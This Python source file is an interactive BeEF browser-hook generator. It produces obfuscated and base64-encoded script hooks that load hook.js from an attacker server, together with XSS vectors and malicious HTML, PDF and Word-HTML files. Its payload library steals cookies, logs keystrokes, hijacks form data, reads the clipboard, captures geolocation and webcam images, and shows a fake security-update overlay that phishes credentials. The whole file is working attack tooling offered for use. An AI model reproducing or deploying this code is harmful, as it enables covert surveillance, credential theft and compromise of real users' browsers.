#!/usr/bin/env python3
import os
import json
import random
import string
import base64
from datetime import datetime

class BeEFHookGenerator:
    def __init__(self):
        self.hooks = []
        self.targets = []
        
        self.hook_templates = {
            'basic': '''<script src="http://{{BEEF_SERVER}}:{{BEEF_PORT}}/hook.js"></script>''',
            
            'obfuscated': '''<script>
(function(){var s=document.createElement('script');
s.type='text/javascript';s.src='http://{{BEEF_SERVER}}:{{BEEF_PORT}}/hook.js';
document.getElementsByTagName('head')[0].appendChild(s);})();
</script>''',
            
            'encoded': '''<script>
eval(atob('{{ENCODED_HOOK}}'));
</script>''',
            
            'iframe': '''<iframe src="http://{{BEEF_SERVER}}:{{BEEF_PORT}}/demos/basic.html" 
width="0" height="0" style="display:none;"></iframe>''',
            
            'image': '''<img src="x" onerror="var s=document.createElement('script');
s.src='http://{{BEEF_SERVER}}:{{BEEF_PORT}}/hook.js';
document.body.appendChild(s);">''',
            
            'dom': '''<script>
window.addEventListener('DOMContentLoaded', function(){
var beef=document.createElement('script');
beef.type='text/javascript';
beef.src='http://{{BEEF_SERVER}}:{{BEEF_PORT}}/hook.js';
document.body.appendChild(beef);
});
</script>''',
            
            'jquery': '''<script>
$.getScript('http://{{BEEF_SERVER}}:{{BEEF_PORT}}/hook.js');
</script>''',
            
            'ajax': '''<script>
var xhr=new XMLHttpRequest();
xhr.open('GET','http://{{BEEF_SERVER}}:{{BEEF_PORT}}/hook.js',true);
xhr.onload=function(){eval(xhr.responseText);};
xhr.send();
</script>''',
            
            'websocket': '''<script>
var ws=new WebSocket('ws://{{BEEF_SERVER}}:{{WS_PORT}}/');
ws.onmessage=function(e){eval(e.data);};
</script>''',
            
            'service_worker': '''<script>
if('serviceWorker' in navigator){
navigator.serviceWorker.register('/sw.js').then(function(){
var s=document.createElement('script');
s.src='http://{{BEEF_SERVER}}:{{BEEF_PORT}}/hook.js';
document.body.appendChild(s);
});
}
</script>'''
        }
        
        self.payloads = {
            'cookie_theft': '''BeEF.execute(function(){
var cookies=document.cookie;
beef.net.send('/api/logs',0,'POST',JSON.stringify({cookies:cookies}));
});''',
            
            'keylogger': '''var keys='';
document.onkeypress=function(e){
keys+=String.fromCharCode(e.which);
if(keys.length>50){
beef.net.send('/api/logs',0,'POST',JSON.stringify({keys:keys}));
keys='';
}
};''',
            
            'form_hijack': '''document.addEventListener('submit',function(e){
var form=e.target;
var data={};
for(var i=0;i<form.elements.length;i++){
var elem=form.elements[i];
if(elem.name)data[elem.name]=elem.value;
}
beef.net.send('/api/logs',0,'POST',JSON.stringify({form:data}));
},true);''',
            
            'clipboard_steal': '''setInterval(function(){
navigator.clipboard.readText().then(function(text){
beef.net.send('/api/logs',0,'POST',JSON.stringify({clipboard:text}));
});
},5000);''',
            
            'geolocation': '''navigator.geolocation.getCurrentPosition(function(pos){
beef.net.send('/api/logs',0,'POST',JSON.stringify({
lat:pos.coords.latitude,
lon:pos.coords.longitude
}));
});''',
            
            'camera_access': '''navigator.mediaDevices.getUserMedia({video:true}).then(function(stream){
var video=document.createElement('video');
video.srcObject=stream;
video.play();
setTimeout(function(){
var canvas=document.createElement('canvas');
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;
canvas.getContext('2d').drawImage(video,0,0);
var img=canvas.toDataURL('image/png');
beef.net.send('/api/logs',0,'POST',JSON.stringify({camera:img}));
stream.getTracks()[0].stop();
},2000);
});''',
            
            'browser_exploit': '''var browser_info={
userAgent:navigator.userAgent,
platform:navigator.platform,
language:navigator.language,
plugins:Array.from(navigator.plugins).map(p=>p.name),
screen:{width:screen.width,height:screen.height},
timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
};
beef.net.send('/api/logs',0,'POST',JSON.stringify(browser_info));''',
            
            'social_engineering': '''var overlay=document.createElement('div');
overlay.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;"><div style="margin:200px auto;width:400px;background:#fff;padding:20px;border-radius:5px;"><h2>Security Update Required</h2><p>Please enter your credentials to continue:</p><form id="phish"><input name="username" placeholder="Username" style="width:100%;margin:10px 0;padding:10px;"><input name="password" type="password" placeholder="Password" style="width:100%;margin:10px 0;padding:10px;"><button type="submit" style="width:100%;padding:10px;background:#007bff;color:#fff;border:none;">Submit</button></form></div></div>';
document.body.appendChild(overlay);
document.getElementById('phish').onsubmit=function(e){
e.preventDefault();
var data={user:this.username.value,pass:this.password.value};
beef.net.send('/api/logs',0,'POST',JSON.stringify(data));
overlay.remove();
};''',
            
            'redirect_attack': '''setTimeout(function(){
window.location.href='http://{{PHISHING_URL}}';
},5000);''',
            
            'persistence': '''localStorage.setItem('beef_hook','true');
if(localStorage.getItem('beef_hook')){
var s=document.createElement('script');
s.src='http://{{BEEF_SERVER}}:{{BEEF_PORT}}/hook.js';
document.body.appendChild(s);
}'''
        }
    
    def generate_hook(self, hook_type, beef_server, beef_port=3000):
        if hook_type not in self.hook_templates:
            return None
        
        template = self.hook_templates[hook_type]
        
        hook_code = template.replace('{{BEEF_SERVER}}', beef_server)
        hook_code = hook_code.replace('{{BEEF_PORT}}', str(beef_port))
        hook_code = hook_code.replace('{{WS_PORT}}', str(beef_port + 1))
        
        if '{{ENCODED_HOOK}}' in hook_code:
            basic_hook = f"var s=document.createElement('script');s.src='http://{beef_server}:{beef_port}/hook.js';document.body.appendChild(s);"
            encoded = base64.b64encode(basic_hook.encode()).decode()
            hook_code = hook_code.replace('{{ENCODED_HOOK}}', encoded)
        
        hook_data = {
            'id': f"HOOK-{random.randint(10000, 99999)}",
            'type': hook_type,
            'server': beef_server,
            'port': beef_port,
            'code': hook_code,
            'created': datetime.now().isoformat()
        }
        
        self.hooks.append(hook_data)
        
        return hook_data
    
    def create_injection_page(self, hook_code, target_url=None):
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    {hook_code}
</head>
<body>
    <h1>Please wait...</h1>
    <p>Content loading...</p>
    <script>
    setTimeout(function(){{
        {'window.location.href="' + target_url + '";' if target_url else 'document.body.innerHTML="<h1>Content Loaded</h1>";'}
    }}, 2000);
    </script>
</body>
</html>'''
        
        return html
    
    def generate_payload_script(self, payloads, beef_server, beef_port):
        script_parts = []
        
        for payload_name in payloads:
            if payload_name in self.payloads:
                payload_code = self.payloads[payload_name]
                payload_code = payload_code.replace('{{BEEF_SERVER}}', beef_server)
                payload_code = payload_code.replace('{{BEEF_PORT}}', str(beef_port))
                script_parts.append(payload_code)
        
        full_script = f'''<script>
setTimeout(function(){{
{chr(10).join(script_parts)}
}}, 1000);
</script>'''
        
        return full_script
    
    def create_xss_vector(self, hook_code):
        vectors = {
            'basic': hook_code,
            'img': f'''<img src=x onerror="{hook_code.replace('<script>', '').replace('</script>', '')}">''',
            'svg': f'''<svg onload="{hook_code.replace('<script>', '').replace('</script>', '')}">''',
            'input': f'''<input onfocus="{hook_code.replace('<script>', '').replace('</script>', '')}" autofocus>''',
            'body': f'''<body onload="{hook_code.replace('<script>', '').replace('</script>', '')}">'''
        }
        
        return vectors
    
    def obfuscate_hook(self, hook_code):
        hook_clean = hook_code.replace('<script>', '').replace('</script>', '').strip()
        
        methods = {
            'hex': ''.join([f'\\x{ord(c):02x}' for c in hook_clean]),
            'unicode': ''.join([f'\\u{ord(c):04x}' for c in hook_clean]),
            'char_codes': '+'.join([f'String.fromCharCode({ord(c)})' for c in hook_clean])
        }
        
        return methods
    
    def create_malicious_file(self, hook_code, file_type='html'):
        if file_type == 'html':
            return self.create_injection_page(hook_code)
        
        elif file_type == 'js':
            return hook_code.replace('<script>', '').replace('</script>', '')
        
        elif file_type == 'pdf':
            pdf_js = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /JavaScript
/JS ({hook_code.replace('<script>', '').replace('</script>', '')})
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
trailer
<<
/Root 1 0 R
>>
%%EOF'''
            return pdf_js
        
        elif file_type == 'doc':
            return f'''<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word">
<head><meta http-equiv=Content-Type content="text/html; charset=windows-1252"></head>
<body>{hook_code}</body>
</html>'''
    
    def generate_attack_report(self, filename='beef_hooks.json'):
        report = {
            'total_hooks': len(self.hooks),
            'hooks': self.hooks,
            'targets': self.targets,
            'generated': datetime.now().isoformat()
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            
            print(f"\033[92m[+] Report saved: {filename}\033[0m")
        
        except Exception as e:
            print(f"\033[91m[!] Report generation failed: {e}\033[0m")
    
    def display_templates(self):
        print(f"\n\033[92m{'='*70}\033[0m")
        print(f"\033[92m[*] AVAILABLE HOOK TEMPLATES\033[0m")
        print(f"\033[92m{'='*70}\033[0m\n")
        
        for i, (key, template) in enumerate(self.hook_templates.items(), 1):
            print(f"\033[93m[{i}] {key.upper()}\033[0m")
            print(f"\033[97m    {template[:80]}...\033[0m\n")
    
    def display_payloads(self):
        print(f"\n\033[92m{'='*70}\033[0m")
        print(f"\033[92m[*] AVAILABLE PAYLOADS\033[0m")
        print(f"\033[92m{'='*70}\033[0m\n")
        
        for i, (key, payload) in enumerate(self.payloads.items(), 1):
            print(f"\033[93m[{i}] {key.upper()}\033[0m")

def run():
    print("\033[92m" + "="*70)
    print("     BROWSER EXPLOITATION FRAMEWORK (BeEF) HOOK GENERATOR")
    print("="*70 + "\033[0m\n")
    
    beef = BeEFHookGenerator()
    
    print("\033[97mOperation mode:\033[0m")
    print("  [1] Generate basic hook")
    print("  [2] Create injection page")
    print("  [3] Generate with payloads")
    print("  [4] Create XSS vectors")
    print("  [5] Obfuscate hook")
    print("  [6] View templates")
    print("  [7] View payloads")
    
    mode = input("\n\033[95m[?] Select: \033[0m").strip()
    
    if mode == '1':
        beef.display_templates()
        
        hook_type = input("\n\033[95m[?] Hook type: \033[0m").strip()
        server = input("\033[95m[?] BeEF server IP: \033[0m").strip()
        port = input("\033[95m[?] BeEF port (3000): \033[0m").strip()
        port = int(port) if port.isdigit() else 3000
        
        hook = beef.generate_hook(hook_type, server, port)
        
        if hook:
            print(f"\n\033[92m[+] Hook generated: {hook['id']}\033[0m\n")
            print("\033[93m" + hook['code'] + "\033[0m")
            
            save = input("\n\033[95m[?] Save to file? (y/n): \033[0m").strip().lower()
            if save == 'y':
                filename = input("\033[95m[?] Filename (hook.html): \033[0m").strip()
                with open(filename if filename else 'hook.html', 'w') as f:
                    f.write(hook['code'])
                print(f"\033[92m[+] Saved\033[0m")
    
    elif mode == '2':
        beef.display_templates()
        
        hook_type = input("\n\033[95m[?] Hook type: \033[0m").strip()
        server = input("\033[95m[?] BeEF server IP: \033[0m").strip()
        port = input("\033[95m[?] BeEF port (3000): \033[0m").strip()
        port = int(port) if port.isdigit() else 3000
        
        hook = beef.generate_hook(hook_type, server, port)
        
        if hook:
            redirect = input("\033[95m[?] Redirect URL (optional): \033[0m").strip()
            
            page = beef.create_injection_page(hook['code'], redirect if redirect else None)
            
            print(f"\n\033[92m[+] Injection page created\033[0m")
            
            filename = input("\033[95m[?] Filename (injection.html): \033[0m").strip()
            with open(filename if filename else 'injection.html', 'w') as f:
                f.write(page)
            print(f"\033[92m[+] Saved\033[0m")
    
    elif mode == '3':
        server = input("\033[95m[?] BeEF server IP: \033[0m").strip()
        port = input("\033[95m[?] BeEF port (3000): \033[0m").strip()
        port = int(port) if port.isdigit() else 3000
        
        beef.display_payloads()
        
        print(f"\n\033[97m[*] Select payloads (comma-separated keys):\033[0m")
        payload_input = input("\033[95m> \033[0m").strip()
        payloads = [p.strip() for p in payload_input.split(',')]
        
        script = beef.generate_payload_script(payloads, server, port)
        
        print(f"\n\033[92m[+] Payload script:\033[0m\n")
        print("\033[93m" + script + "\033[0m")
        
        save = input("\n\033[95m[?] Save to file? (y/n): \033[0m").strip().lower()
        if save == 'y':
            filename = input("\033[95m[?] Filename (payload.html): \033[0m").strip()
            with open(filename if filename else 'payload.html', 'w') as f:
                f.write(script)
            print(f"\033[92m[+] Saved\033[0m")
    
    elif mode == '4':
        hook_type = input("\033[95m[?] Hook type: \033[0m").strip()
        server = input("\033[95m[?] BeEF server IP: \033[0m").strip()
        
        hook = beef.generate_hook(hook_type, server)
        
        if hook:
            vectors = beef.create_xss_vector(hook['code'])
            
            print(f"\n\033[92m[+] XSS Vectors:\033[0m\n")
            for vector_type, vector_code in vectors.items():
                print(f"\033[93m{vector_type.upper()}:\033[0m")
                print(f"\033[97m{vector_code}\033[0m\n")
    
    elif mode == '5':
        hook_type = input("\033[95m[?] Hook type: \033[0m").strip()
        server = input("\033[95m[?] BeEF server IP: \033[0m").strip()
        
        hook = beef.generate_hook(hook_type, server)
        
        if hook:
            obfuscated = beef.obfuscate_hook(hook['code'])
            
            print(f"\n\033[92m[+] Obfuscated versions:\033[0m\n")
            for method, code in obfuscated.items():
                print(f"\033[93m{method.upper()}:\033[0m")
                print(f"\033[97m{code[:100]}...\033[0m\n")
    
    elif mode == '6':
        beef.display_templates()
    
    elif mode == '7':
        beef.display_payloads()
    
    print(f"\n\033[92m[+] Done\033[0m")

if __name__ == "__main__":
    run()
